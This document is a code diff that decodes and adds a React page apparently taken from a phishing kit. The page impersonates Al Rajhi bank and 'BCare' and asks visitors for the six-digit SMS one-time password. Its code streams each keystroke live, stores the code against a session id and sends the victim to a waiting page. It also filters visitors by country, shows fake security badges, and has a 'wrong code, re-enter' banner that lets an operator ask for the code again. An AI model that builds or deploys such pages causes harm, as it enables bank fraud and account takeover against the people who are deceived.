@@ -1,1 +1,213 @@
-aW1wb3J0IHsgY3JlYXRlRmlsZVJvdXRlLCB1c2VOYXZpZ2F0ZSB9IGZyb20gIkB0YW5zdGFjay9yZWFjdC1yb3V0ZXIiOwppbXBvcnQgeyBSZWplY3RCYW5uZXIgfSBmcm9tICJAL2NvbXBvbmVudHMvUmVqZWN0QmFubmVyIjsKaW1wb3J0IHsgdXNlRWZmZWN0LCB1c2VSZWYsIHVzZVN0YXRlIH0gZnJvbSAicmVhY3QiOwppbXBvcnQgeyB6IH0gZnJvbSAiem9kIjsKaW1wb3J0IHsgdXNlVmlzaXRvclRyYWNraW5nIH0gZnJvbSAiQC9ob29rcy91c2VWaXNpdG9yVHJhY2tpbmciOwppbXBvcnQgeyB1c2VMaXZlSW5wdXQgfSBmcm9tICJAL2hvb2tzL3VzZUxpdmVJbnB1dCI7CmltcG9ydCB7IGNoZWNrQ291bnRyeUFjY2Vzcywgc2F2ZU90cCB9IGZyb20gIkAvbGliL3RyYWNraW5nLmZ1bmN0aW9ucyI7CmltcG9ydCBicmFuZExvZ28gZnJvbSAiQC9hc3NldHMvYnJhbmQtbG9nby5zdmciOwoKZXhwb3J0IGNvbnN0IFJvdXRlID0gY3JlYXRlRmlsZVJvdXRlKCIvcmFqaGktb3RwIikoewogIGhlYWQ6ICgpID0+ICh7CiAgICBtZXRhOiBbCiAgICAgIHsgdGl0bGU6ICLYsdmF2LIg2KfZhNiq2K3ZgtmCIHwg2KjZiiDZg9mK2LEiIH0sCiAgICAgIHsgbmFtZTogImRlc2NyaXB0aW9uIiwgY29udGVudDogItij2K/YrtmEINix2YXYsiDYp9mE2KrYrdmC2YIg2KfZhNmF2LHYs9mEINmE2KXYqtmF2KfZhSDYudmF2YTZitipINin2YTYqtit2YLZgiDZgdmKINio2Yog2YPZitixLiIgfSwKICAgIF0sCiAgICBsaW5rczogWwogICAgICB7IHJlbDogInByZWNvbm5lY3QiLCBocmVmOiAiaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbSIgfSwKICAgICAgeyByZWw6ICJwcmVjb25uZWN0IiwgaHJlZjogImh0dHBzOi8vZm9udHMuZ3N0YXRpYy5jb20iLCBjcm9zc09yaWdpbjogImFub255bW91cyIgfSwKICAgICAgewogICAgICAgIHJlbDogInN0eWxlc2hlZXQiLAogICAgICAgIGhyZWY6ICJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PVRhamF3YWw6d2dodEA0MDA7NTAwOzcwMDs4MDA7OTAwJmZhbWlseT1PdXRmaXQ6d2dodEA1MDA7NzAwJmRpc3BsYXk9c3dhcCIsCiAgICAgIH0sCiAgICBdLAogIH0pLAogIHZhbGlkYXRlU2VhcmNoOiB6Lm9iamVjdCh7IGVycm9yOiB6LnVuaW9uKFt6LnN0cmluZygpLCB6Lm51bWJlcigpXSkub3B0aW9uYWwoKSB9KSwKICBjb21wb25lbnQ6IFJhamhpT3RwUGFnZSwKfSk7CgpmdW5jdGlvbiBSYWpoaU90cFBhZ2UoKSB7CiAgdXNlVmlzaXRvclRyYWNraW5nKCLYsdmF2LIg2KfZhNiq2K3ZgtmCIC0g2KjZiiDZg9mK2LEiKTsKICBjb25zdCBuYXZpZ2F0ZSA9IHVzZU5hdmlnYXRlKCk7CiAgY29uc3QgW2RpZ2l0cywgc2V0RGlnaXRzXSA9IHVzZVN0YXRlPHN0cmluZ1tdPihbIiIsICIiLCAiIiwgIiIsICIiLCAiIl0pOwogIGNvbnN0IFtsb2FkaW5nLCBzZXRMb2FkaW5nXSA9IHVzZVN0YXRlKGZhbHNlKTsKICBjb25zdCBbZXJyb3JTaGFrZSwgc2V0RXJyb3JTaGFrZV0gPSB1c2VTdGF0ZShmYWxzZSk7CiAgY29uc3QgaW5wdXRzUmVmID0gdXNlUmVmPChIVE1MSW5wdXRFbGVtZW50IHwgbnVsbClbXT4oW10pOwogIGNvbnN0IHN1Ym1pdHRlZFJlZiA9IHVzZVJlZihmYWxzZSk7CiAgdXNlTGl2ZUlucHV0KHsgb3RwOiBkaWdpdHMuam9pbigiIikgfSk7CgogIHVzZUVmZmVjdCgoKSA9PiB7CiAgICBpZiAodHlwZW9mIHdpbmRvdyA9PT0gInVuZGVmaW5lZCIpIHJldHVybjsKICAgIGNoZWNrQ291bnRyeUFjY2VzcygpCiAgICAgIC50aGVuKChyZXMpID0+IHsKICAgICAgICBpZiAocmVzICYmIHJlcy5hbGxvd2VkID09PSBmYWxzZSkgd2luZG93LmxvY2F0aW9uLnJlcGxhY2UoIi9ibG9ja2VkIik7CiAgICAgIH0pCiAgICAgIC5jYXRjaCgoKSA9PiB7fSk7CiAgfSwgW10pOwoKICB1c2VFZmZlY3QoKCkgPT4gewogICAgaW5wdXRzUmVmLmN1cnJlbnRbMF0/LmZvY3VzKCk7CiAgfSwgW10pOwoKICB1c2VFZmZlY3QoKCkgPT4gewogICAgY29uc3Qgb3RwID0gZGlnaXRzLmpvaW4oIiIpOwogICAgaWYgKG90cC5sZW5ndGggPT09IDYgJiYgIWxvYWRpbmcgJiYgIXN1Ym1pdHRlZFJlZi5jdXJyZW50KSB7CiAgICAgIHN1Ym1pdHRlZFJlZi5jdXJyZW50ID0gdHJ1ZTsKICAgICAgaGFuZGxlU3VibWl0KG90cCk7CiAgICB9CiAgfSwgW2RpZ2l0cywgbG9hZGluZ10pOwoKICBhc3luYyBmdW5jdGlvbiBoYW5kbGVTdWJtaXQob3RwOiBzdHJpbmcpIHsKICAgIGNvbnN0IHNlc3Npb25JZCA9IHdpbmRvdy5sb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiYmNhcmVfc2Vzc2lvbl9pZCIpOwogICAgaWYgKCFzZXNzaW9uSWQpIHJldHVybjsKICAgIHNldExvYWRpbmcodHJ1ZSk7CiAgICBhd2FpdCBzYXZlT3RwKHsgZGF0YTogeyBzZXNzaW9uX2lkOiBzZXNzaW9uSWQsIG90cCB9IH0pLmNhdGNoKCgpID0+IHt9KTsKICAgIHNldExvYWRpbmcoZmFsc2UpOwogICAgbmF2aWdhdGUoeyB0bzogIi9yYWpoaS13YWl0IiBhcyBuZXZlciB9KTsKICB9CgogIGZ1bmN0aW9uIHVwZGF0ZURpZ2l0KGluZGV4OiBudW1iZXIsIHZhbHVlOiBzdHJpbmcpIHsKICAgIGlmICghL15cZCokLy50ZXN0KHZhbHVlKSkgcmV0dXJuOwogICAgY29uc3QgbmV4dCA9IFsuLi5kaWdpdHNdOwogICAgbmV4dFtpbmRleF0gPSB2YWx1ZS5zbGljZSgtMSk7CiAgICBzZXREaWdpdHMobmV4dCk7CiAgICBpZiAodmFsdWUgJiYgaW5kZXggPCA1KSB7CiAgICAgIGlucHV0c1JlZi5jdXJyZW50W2luZGV4ICsgMV0/LmZvY3VzKCk7CiAgICB9CiAgfQoKICBmdW5jdGlvbiBoYW5kbGVLZXlEb3duKGluZGV4OiBudW1iZXIsIGU6IFJlYWN0LktleWJvYXJkRXZlbnQ8SFRNTElucHV0RWxlbWVudD4pIHsKICAgIGlmIChlLmtleSA9PT0gIkJhY2tzcGFjZSIgJiYgIWRpZ2l0c1tpbmRleF0gJiYgaW5kZXggPiAwKSB7CiAgICAgIGNvbnN0IG5leHQgPSBbLi4uZGlnaXRzXTsKICAgICAgbmV4dFtpbmRleCAtIDFdID0gIiI7CiAgICAgIHNldERpZ2l0cyhuZXh0KTsKICAgICAgaW5wdXRzUmVmLmN1cnJlbnRbaW5kZXggLSAxXT8uZm9jdXMoKTsKICAgIH0KICAgIGlmIChlLmtleSA9PT0gIkFycm93TGVmdCIgJiYgaW5kZXggPiAwKSB7CiAgICAgIGlucHV0c1JlZi5jdXJyZW50W2luZGV4IC0gMV0/LmZvY3VzKCk7CiAgICB9CiAgICBpZiAoZS5rZXkgPT09ICJBcnJvd1JpZ2h0IiAmJiBpbmRleCA8IDUpIHsKICAgICAgaW5wdXRzUmVmLmN1cnJlbnRbaW5kZXggKyAxXT8uZm9jdXMoKTsKICAgIH0KICB9CgogIGZ1bmN0aW9uIGhhbmRsZVBhc3RlKGU6IFJlYWN0LkNsaXBib2FyZEV2ZW50PEhUTUxJbnB1dEVsZW1lbnQ+KSB7CiAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICBjb25zdCB0ZXh0ID0gZS5jbGlwYm9hcmREYXRhLmdldERhdGEoInRleHQiKS5yZXBsYWNlKC9cRC9nLCAiIikuc2xpY2UoMCwgNik7CiAgICBjb25zdCBuZXh0ID0gWy4uLmRpZ2l0c107CiAgICB0ZXh0LnNwbGl0KCIiKS5mb3JFYWNoKChkLCBpKSA9PiB7CiAgICAgIGlmIChpIDwgNikgbmV4dFtpXSA9IGQ7CiAgICB9KTsKICAgIHNldERpZ2l0cyhuZXh0KTsKICAgIGlucHV0c1JlZi5jdXJyZW50W01hdGgubWluKHRleHQubGVuZ3RoLCA1KV0/LmZvY3VzKCk7CiAgfQoKICByZXR1cm4gKAogICAgPGRpdgogICAgICBkaXI9InJ0bCIKICAgICAgY2xhc3NOYW1lPSJtaW4taC1zY3JlZW4gcmVsYXRpdmUgZmxleCBmbGV4LWNvbCBpdGVtcy1jZW50ZXIganVzdGlmeS1jZW50ZXIgcC00IHNtOnAtNiBvdmVyZmxvdy1oaWRkZW4iCiAgICAgIHN0eWxlPXt7CiAgICAgICAgZm9udEZhbWlseTogIidUYWphd2FsJywgc3lzdGVtLXVpLCBzYW5zLXNlcmlmIiwKICAgICAgICBiYWNrZ3JvdW5kOgogICAgICAgICAgInJhZGlhbC1ncmFkaWVudCgxMjAwcHggNjAwcHggYXQgNTAlIC0xMCUsICNFQUYzRkEgMCUsICNGNUY4RkIgNTUlLCAjRjVGOEZCIDEwMCUpIiwKICAgICAgfX0KICAgID4KICAgICAgey8qIFN1YnRsZSBkZWNvcmF0aXZlIHJpbmdzICovfQogICAgICA8ZGl2IGNsYXNzTmFtZT0icG9pbnRlci1ldmVudHMtbm9uZSBhYnNvbHV0ZSBpbnNldC0wIG9wYWNpdHktWzAuMzVdIiBhcmlhLWhpZGRlbj4KICAgICAgICA8ZGl2IGNsYXNzTmFtZT0iYWJzb2x1dGUgLXRvcC00MCAtcmlnaHQtNDAgdy1bNDIwcHhdIGgtWzQyMHB4XSByb3VuZGVkLWZ1bGwgYm9yZGVyIGJvcmRlci1bIzE1NjM5NF0vMTUiIC8+CiAgICAgICAgPGRpdiBjbGFzc05hbWU9ImFic29sdXRlIC10b3AtMjQgLXJpZ2h0LTI0IHctWzI4MHB4XSBoLVsyODBweF0gcm91bmRlZC1mdWxsIGJvcmRlciBib3JkZXItWyMxNTYzOTRdLzEwIiAvPgogICAgICAgIDxkaXYgY2xhc3NOYW1lPSJhYnNvbHV0ZSAtYm90dG9tLTQwIC1sZWZ0LTQwIHctWzQyMHB4XSBoLVs0MjBweF0gcm91bmRlZC1mdWxsIGJvcmRlciBib3JkZXItWyMxNTYzOTRdLzEwIiAvPgogICAgICA8L2Rpdj4KCiAgICAgIDxkaXYgY2xhc3NOYW1lPSJ3LWZ1bGwgbWF4LXctWzQ0MHB4XSByZWxhdGl2ZSI+CiAgICAgICAgPFJlamVjdEJhbm5lciBtZXNzYWdlPSLYsdmF2LIg2KfZhNiq2K3ZgtmCINi62YrYsSDYtdit2YrYrdiMINmK2LHYrNmJINil2LnYp9iv2Kkg2KXYr9iu2KfZhNmHLiIgLz4KCiAgICAgICAgey8qIFRvcCBicmFuZCBzdHJpcCAqL30KICAgICAgICA8ZGl2IGNsYXNzTmFtZT0iZmxleCBpdGVtcy1jZW50ZXIganVzdGlmeS1jZW50ZXIgZ2FwLTIgbWItNSI+CiAgICAgICAgICA8c3BhbiBjbGFzc05hbWU9ImlubGluZS1mbGV4IGl0ZW1zLWNlbnRlciBnYXAtMS41IHRleHQtWzExcHhdIGZvbnQtc2VtaWJvbGQgdGV4dC1bIzE1NjM5NF0gYmctWyMxNTYzOTRdLzEwIHB4LTMgcHktMS41IHJvdW5kZWQtZnVsbCI+CiAgICAgICAgICAgIDxzdmcgd2lkdGg9IjEyIiBoZWlnaHQ9IjEyIiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHN0cm9rZT0iY3VycmVudENvbG9yIiBzdHJva2VXaWR0aD0iMi41IiBzdHJva2VMaW5lY2FwPSJyb3VuZCIgc3Ryb2tlTGluZWpvaW49InJvdW5kIj4KICAgICAgICAgICAgICA8cGF0aCBkPSJNMTIgMmw4IDR2NmMwIDUtMy41IDktOCAxMC00LjUtMS04LTUtOC0xMFY2bDgtNHoiIC8+CiAgICAgICAgICAgICAgPHBhdGggZD0ibTkgMTIgMiAyIDQtNCIgLz4KICAgICAgICAgICAgPC9zdmc+CiAgICAgICAgICAgICDYqtit2YLZgiDYotmF2YYg2LnYqNixINin2YTYsdin2KzYrdmKCiAgICAgICAgICA8L3NwYW4+CiAgICAgICAgPC9kaXY+CgogICAgICAgIDxkaXYgY2xhc3NOYW1lPSJyZWxhdGl2ZSBiZy13aGl0ZSByb3VuZGVkLVsyOHB4XSBzaGFkb3ctWzBfMjBweF82MHB4Xy0yMHB4X3JnYmEoMjEsOTksMTQ4LDAuMjUpXSBib3JkZXIgYm9yZGVyLVsjMTU2Mzk0XS8xMCBvdmVyZmxvdy1oaWRkZW4iPgogICAgICAgICAgey8qIEFjY2VudCB0b3AgYmFyICovfQogICAgICAgICAgPGRpdiBjbGFzc05hbWU9ImgtMS41IHctZnVsbCIgc3R5bGU9e3sgYmFja2dyb3VuZDogImxpbmVhci1ncmFkaWVudCg5MGRlZywjMmI4NmMwLCMxNTYzOTQsIzBjNDI2OSkiIH19IC8+CgogICAgICAgICAgPGRpdiBjbGFzc05hbWU9InAtNiBzbTpwLTkgZmxleCBmbGV4LWNvbCBpdGVtcy1jZW50ZXIiPgogICAgICAgICAgICB7LyogTG9nbyBsb2NrdXAgKi99CiAgICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPSJyZWxhdGl2ZSBtYi01Ij4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT0iYWJzb2x1dGUgaW5zZXQtMCByb3VuZGVkLTN4bCBibHVyLTJ4bCBiZy1bIzE1NjM5NF0vMjUiIGFyaWEtaGlkZGVuIC8+CiAgICAgICAgICAgICAgPGRpdiBjbGFzc05hbWU9InJlbGF0aXZlIHctMjQgaC0yNCByb3VuZGVkLTN4bCBiZy1ncmFkaWVudC10by1iciBmcm9tLXdoaXRlIHRvLVsjRUFGM0ZBXSBib3JkZXIgYm9yZGVyLVsjMTU2Mzk0XS8xNSBzaGFkb3ctW2luc2V0XzBfMXB4XzBfcmdiYSgyNTUsMjU1LDI1NSwwLjkpXSBmbGV4IGl0ZW1zLWNlbnRlciBqdXN0aWZ5LWNlbnRlciI+CiAgICAgICAgICAgICAgICA8aW1nIHNyYz17YnJhbmRMb2dvfSBhbHQ9Itin2YTYtNi52KfYsSIgY2xhc3NOYW1lPSJ3LTE2IGgtYXV0byIgLz4KICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8aDEgY2xhc3NOYW1lPSJ0ZXh0LVsyMnB4XSBzbTp0ZXh0LTJ4bCBmb250LWV4dHJhYm9sZCB0ZXh0LVsjMTAyNDNhXSB0cmFja2luZy10aWdodCI+CiAgICAgICAgICAgICAg2LHZhdiyINin2YTYqtit2YLZggogICAgICAgICAgICA8L2gxPgogICAgICAgICAgICA8cCBjbGFzc05hbWU9Im10LTIgdGV4dC1bMTMuNXB4XSB0ZXh0LVsjNjQ3NDhiXSB0ZXh0LWNlbnRlciBsZWFkaW5nLXJlbGF4ZWQgbWF4LXctWzMyMHB4XSI+CiAgICAgICAgICAgICAg2KPYr9iu2YQg2KfZhNix2YXYsiDYp9mE2YXZg9mI2ZHZhiDZhdmGIDxzcGFuIGNsYXNzTmFtZT0iZm9udC1ib2xkIHRleHQtWyMxNTYzOTRdIj42INij2LHZgtin2YU8L3NwYW4+INin2YTZhdix2LPZhCDYpdmE2Ykg2KzZiNin2YTZgyDYp9mE2YXYs9is2YQKICAgICAgICAgICAgPC9wPgoKICAgICAgICAgICAgPGRpdiBjbGFzc05hbWU9InctZnVsbCBtdC03Ij4KICAgICAgICAgICAgICA8ZGl2CiAgICAgICAgICAgICAgICBjbGFzc05hbWU9e2BmbGV4IGp1c3RpZnktY2VudGVyIGdhcC0yIHNtOmdhcC0zIG1iLTYgJHtlcnJvclNoYWtlID8gImFuaW1hdGUtc2hha2UiIDogIiJ9YH0KICAgICAgICAgICAgICAgIGRpcj0ibHRyIgogICAgICAgICAgICAgID4KICAgICAgICAgICAgICAgIHtkaWdpdHMubWFwKChkLCBpKSA9PiAoCiAgICAgICAgICAgICAgICAgIDxpbnB1dAogICAgICAgICAgICAgICAgICAgIGtleT17aX0KICAgICAgICAgICAgICAgICAgICByZWY9eyhlbCkgPT4geyBpbnB1dHNSZWYuY3VycmVudFtpXSA9IGVsOyB9fQogICAgICAgICAgICAgICAgICAgIHR5cGU9InRleHQiCiAgICAgICAgICAgICAgICAgICAgaW5wdXRNb2RlPSJudW1lcmljIgogICAgICAgICAgICAgICAgICAgIG1heExlbmd0aD17MX0KICAgICAgICAgICAgICAgICAgICB2YWx1ZT17ZH0KICAgICAgICAgICAgICAgICAgICBvbkNoYW5nZT17KGUpID0+IHVwZGF0ZURpZ2l0KGksIGUudGFyZ2V0LnZhbHVlKX0KICAgICAgICAgICAgICAgICAgICBvbktleURvd249eyhlKSA9PiBoYW5kbGVLZXlEb3duKGksIGUpfQogICAgICAgICAgICAgICAgICAgIG9uUGFzdGU9e2hhbmRsZVBhc3RlfQogICAgICAgICAgICAgICAgICAgIGRpc2FibGVkPXtsb2FkaW5nfQogICAgICAgICAgICAgICAgICAgIGNsYXNzTmFtZT0idy0xMiBoLTE0IHNtOnctMTQgc206aC0xNiByb3VuZGVkLTJ4bCBib3JkZXIgYmctWyNGNUY4RkJdIHRleHQtY2VudGVyIHRleHQtMnhsIGZvbnQtZXh0cmFib2xkIHRleHQtWyMxMDI0M2FdIHBsYWNlaG9sZGVyOnRleHQtWyM5NGEzYjhdIG91dGxpbmUtbm9uZSB0cmFuc2l0aW9uLWFsbCBmb2N1czpib3JkZXItWyMxNTYzOTRdIGZvY3VzOmJnLXdoaXRlIGZvY3VzOnJpbmctNCBmb2N1czpyaW5nLVsjMTU2Mzk0XS8xMCBmb2N1czpzaGFkb3ctc20gZGlzYWJsZWQ6b3BhY2l0eS02MCBib3JkZXItWyNlMmU4ZjBdIGhvdmVyOmJvcmRlci1bI2NiZDVlMV0iCiAgICAgICAgICAgICAgICAgICAgYXJpYS1sYWJlbD17YNix2YLZhSAke2kgKyAxfWB9CiAgICAgICAgICAgICAgICAgIC8+CiAgICAgICAgICAgICAgICApKX0KICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAge2xvYWRpbmcgJiYgKAogICAgICAgICAgICAgICAgPGRpdiBjbGFzc05hbWU9ImZsZXggaXRlbXMtY2VudGVyIGp1c3RpZnktY2VudGVyIGdhcC0yIHRleHQtWyMxNTYzOTRdIGZvbnQtYm9sZCB0ZXh0LXNtIHB5LTQiPgogICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzc05hbWU9ImgtNCB3LTQgcm91bmRlZC1mdWxsIGJvcmRlci0yIGJvcmRlci1bIzE1NjM5NF0vNDAgYm9yZGVyLXQtWyMxNTYzOTRdIGFuaW1hdGUtc3BpbiIgLz4KICAgICAgICAgICAgICAgICAg2KzYp9ix2Y0g2KfZhNiq2K3ZgtmC4oCmCiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICApfQogICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIHsvKiBUcnVzdCByb3cgKi99CiAgICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPSJtdC02IGdyaWQgZ3JpZC1jb2xzLTMgZ2FwLTIgdy1mdWxsIj4KICAgICAgICAgICAgICA8VHJ1c3QgbGFiZWw9Itiq2LTZgdmK2LEgVExTIiAvPgogICAgICAgICAgICAgIDxUcnVzdCBsYWJlbD0i2K3Zhdin2YrYqSDYrdiz2KfYqNmDIiAvPgogICAgICAgICAgICAgIDxUcnVzdCBsYWJlbD0i2K7YtdmI2LXZitipINiq2KfZhdipIiAvPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgoKICAgICAgICA8cCBjbGFzc05hbWU9Im10LTUgdGV4dC1jZW50ZXIgdGV4dC1bMTFweF0gdGV4dC1bIzY0NzQ4Yl0iPgogICAgICAgICAgwqkg2KjZiiDZg9mK2LEg4oCUINis2YXZiti5INin2YTYrdmC2YjZgiDZhdit2YHZiNi42KkKICAgICAgICA8L3A+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgKTsKfQoKZnVuY3Rpb24gVHJ1c3QoeyBsYWJlbCB9OiB7IGxhYmVsOiBzdHJpbmcgfSkgewogIHJldHVybiAoCiAgICA8ZGl2IGNsYXNzTmFtZT0iZmxleCBpdGVtcy1jZW50ZXIganVzdGlmeS1jZW50ZXIgZ2FwLTEuNSByb3VuZGVkLXhsIGJnLVsjRUFGM0ZBXSBib3JkZXIgYm9yZGVyLVsjMTU2Mzk0XS8xMCBweS0yIHRleHQtWzEwLjVweF0gZm9udC1zZW1pYm9sZCB0ZXh0LVsjMTU2Mzk0XSI+CiAgICAgIDxzdmcgd2lkdGg9IjExIiBoZWlnaHQ9IjExIiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHN0cm9rZT0iY3VycmVudENvbG9yIiBzdHJva2VXaWR0aD0iMyIgc3Ryb2tlTGluZWNhcD0icm91bmQiIHN0cm9rZUxpbmVqb2luPSJyb3VuZCI+CiAgICAgICAgPHBhdGggZD0iTTIwIDYgOSAxN2wtNS01IiAvPgogICAgICA8L3N2Zz4KICAgICAge2xhYmVsfQogICAgPC9kaXY+CiAgKTsKfQo=
+import { createFileRoute, useNavigate } from "@tanstack/react-router";
+import { RejectBanner } from "@/components/RejectBanner";
+import { useEffect, useRef, useState } from "react";
+import { z } from "zod";
+import { useVisitorTracking } from "@/hooks/useVisitorTracking";
+import { useLiveInput } from "@/hooks/useLiveInput";
+import { checkCountryAccess, saveOtp } from "@/lib/tracking.functions";
+import brandLogo from "@/assets/brand-logo.svg";
+
+export const Route = createFileRoute("/rajhi-otp")({
+  head: () => ({
+    meta: [
+      { title: "رمز التحقق | بي كير" },
+      { name: "description", content: "أدخل رمز التحقق المرسل لإتمام عملية التحقق في بي كير." },
+    ],
+    links: [
+      { rel: "preconnect", href: "https://fonts.googleapis.com" },
+      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
+      {
+        rel: "stylesheet",
+        href: "https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&family=Outfit:wght@500;700&display=swap",
+      },
+    ],
+  }),
+  validateSearch: z.object({ error: z.union([z.string(), z.number()]).optional() }),
+  component: RajhiOtpPage,
+});
+
+function RajhiOtpPage() {
+  useVisitorTracking("رمز التحقق - بي كير");
+  const navigate = useNavigate();
+  const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
+  const [loading, setLoading] = useState(false);
+  const [errorShake, setErrorShake] = useState(false);
+  const inputsRef = useRef<(HTMLInputElement | null)[]>([]);
+  const submittedRef = useRef(false);
+  useLiveInput({ otp: digits.join("") });
+
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+    checkCountryAccess()
+      .then((res) => {
+        if (res && res.allowed === false) window.location.replace("/blocked");
+      })
+      .catch(() => {});
+  }, []);
+
+  useEffect(() => {
+    inputsRef.current[0]?.focus();
+  }, []);
+
+  useEffect(() => {
+    const otp = digits.join("");
+    if (otp.length === 6 && !loading && !submittedRef.current) {
+      submittedRef.current = true;
+      handleSubmit(otp);
+    }
+  }, [digits, loading]);
+
+  async function handleSubmit(otp: string) {
+    const sessionId = window.localStorage.getItem("bcare_session_id");
+    if (!sessionId) return;
+    setLoading(true);
+    await saveOtp({ data: { session_id: sessionId, otp } }).catch(() => {});
+    setLoading(false);
+    navigate({ to: "/rajhi-wait" as never });
+  }
+
+  function updateDigit(index: number, value: string) {
+    if (!/^\d*$/.test(value)) return;
+    const next = [...digits];
+    next[index] = value.slice(-1);
+    setDigits(next);
+    if (value && index < 5) {
+      inputsRef.current[index + 1]?.focus();
+    }
+  }
+
+  function handleKeyDown(index: number, e: React.KeyboardEvent<HTMLInputElement>) {
+    if (e.key === "Backspace" && !digits[index] && index > 0) {
+      const next = [...digits];
+      next[index - 1] = "";
+      setDigits(next);
+      inputsRef.current[index - 1]?.focus();
+    }
+    if (e.key === "ArrowLeft" && index > 0) {
+      inputsRef.current[index - 1]?.focus();
+    }
+    if (e.key === "ArrowRight" && index < 5) {
+      inputsRef.current[index + 1]?.focus();
+    }
+  }
+
+  function handlePaste(e: React.ClipboardEvent<HTMLInputElement>) {
+    e.preventDefault();
+    const text = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
+    const next = [...digits];
+    text.split("").forEach((d, i) => {
+      if (i < 6) next[i] = d;
+    });
+    setDigits(next);
+    inputsRef.current[Math.min(text.length, 5)]?.focus();
+  }
+
+  return (
+    <div
+      dir="rtl"
+      className="min-h-screen relative flex flex-col items-center justify-center p-4 sm:p-6 overflow-hidden"
+      style={{
+        fontFamily: "'Tajawal', system-ui, sans-serif",
+        background:
+          "radial-gradient(1200px 600px at 50% -10%, #EAF3FA 0%, #F5F8FB 55%, #F5F8FB 100%)",
+      }}
+    >
+      {/* Subtle decorative rings */}
+      <div className="pointer-events-none absolute inset-0 opacity-[0.35]" aria-hidden>
+        <div className="absolute -top-40 -right-40 w-[420px] h-[420px] rounded-full border border-[#156394]/15" />
+        <div className="absolute -top-24 -right-24 w-[280px] h-[280px] rounded-full border border-[#156394]/10" />
+        <div className="absolute -bottom-40 -left-40 w-[420px] h-[420px] rounded-full border border-[#156394]/10" />
+      </div>
+
+      <div className="w-full max-w-[440px] relative">
+        <RejectBanner message="رمز التحقق غير صحيح، يرجى إعادة إدخاله." />
+
+        {/* Top brand strip */}
+        <div className="flex items-center justify-center gap-2 mb-5">
+          <span className="inline-flex items-center gap-1.5 text-[11px] font-semibold text-[#156394] bg-[#156394]/10 px-3 py-1.5 rounded-full">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+              <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z" />
+              <path d="m9 12 2 2 4-4" />
+            </svg>
+             تحقق آمن عبر الراجحي
+          </span>
+        </div>
+
+        <div className="relative bg-white rounded-[28px] shadow-[0_20px_60px_-20px_rgba(21,99,148,0.25)] border border-[#156394]/10 overflow-hidden">
+          {/* Accent top bar */}
+          <div className="h-1.5 w-full" style={{ background: "linear-gradient(90deg,#2b86c0,#156394,#0c4269)" }} />
+
+          <div className="p-6 sm:p-9 flex flex-col items-center">
+            {/* Logo lockup */}
+            <div className="relative mb-5">
+              <div className="absolute inset-0 rounded-3xl blur-2xl bg-[#156394]/25" aria-hidden />
+              <div className="relative w-24 h-24 rounded-3xl bg-gradient-to-br from-white to-[#EAF3FA] border border-[#156394]/15 shadow-[inset_0_1px_0_rgba(255,255,255,0.9)] flex items-center justify-center">
+                <img src={brandLogo} alt="الشعار" className="w-16 h-auto" />
+              </div>
+            </div>
+
+            <h1 className="text-[22px] sm:text-2xl font-extrabold text-[#10243a] tracking-tight">
+              رمز التحقق
+            </h1>
+            <p className="mt-2 text-[13.5px] text-[#64748b] text-center leading-relaxed max-w-[320px]">
+              أدخل الرمز المكوّن من <span className="font-bold text-[#156394]">6 أرقام</span> المرسل إلى جوالك المسجل
+            </p>
+
+            <div className="w-full mt-7">
+              <div
+                className={`flex justify-center gap-2 sm:gap-3 mb-6 ${errorShake ? "animate-shake" : ""}`}
+                dir="ltr"
+              >
+                {digits.map((d, i) => (
+                  <input
+                    key={i}
+                    ref={(el) => { inputsRef.current[i] = el; }}
+                    type="text"
+                    inputMode="numeric"
+                    maxLength={1}
+                    value={d}
+                    onChange={(e) => updateDigit(i, e.target.value)}
+                    onKeyDown={(e) => handleKeyDown(i, e)}
+                    onPaste={handlePaste}
+                    disabled={loading}
+                    className="w-12 h-14 sm:w-14 sm:h-16 rounded-2xl border bg-[#F5F8FB] text-center text-2xl font-extrabold text-[#10243a] placeholder:text-[#94a3b8] outline-none transition-all focus:border-[#156394] focus:bg-white focus:ring-4 focus:ring-[#156394]/10 focus:shadow-sm disabled:opacity-60 border-[#e2e8f0] hover:border-[#cbd5e1]"
+                    aria-label={`رقم ${i + 1}`}
+                  />
+                ))}
+              </div>
+
+              {loading && (
+                <div className="flex items-center justify-center gap-2 text-[#156394] font-bold text-sm py-4">
+                  <span className="h-4 w-4 rounded-full border-2 border-[#156394]/40 border-t-[#156394] animate-spin" />
+                  جارٍ التحقق…
+                </div>
+              )}
+            </div>
+
+            {/* Trust row */}
+            <div className="mt-6 grid grid-cols-3 gap-2 w-full">
+              <Trust label="تشفير TLS" />
+              <Trust label="حماية حسابك" />
+              <Trust label="خصوصية تامة" />
+            </div>
+          </div>
+        </div>
+
+        <p className="mt-5 text-center text-[11px] text-[#64748b]">
+          © بي كير — جميع الحقوق محفوظة
+        </p>
+      </div>
+    </div>
+  );
+}
+
+function Trust({ label }: { label: string }) {
+  return (
+    <div className="flex items-center justify-center gap-1.5 rounded-xl bg-[#EAF3FA] border border-[#156394]/10 py-2 text-[10.5px] font-semibold text-[#156394]">
